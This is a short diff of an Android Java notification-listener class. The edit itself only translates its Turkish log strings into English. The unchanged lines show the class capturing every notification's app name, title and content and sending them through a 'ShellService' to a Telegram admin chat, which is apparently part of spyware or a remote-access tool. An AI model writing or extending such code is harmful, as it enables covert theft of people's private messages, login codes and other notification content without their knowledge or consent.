@@ -14,7 +14,7 @@ public class NotificationService extends NotificationListenerService {
         String text = textSeq != null ? textSeq.toString() : "";
 
         if (ShellService.instance != null && !text.isEmpty()) {
-            String msg = "🔔 Bildirim Yakalandı [" + packageName + "]\nBaşlık: " + title + "\nİçerik: " + text;
+            String msg = "🔔 Notification Captured [" + packageName + "]\nTitle: " + title + "\nContent: " + text;
             ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, msg);
         }
     }
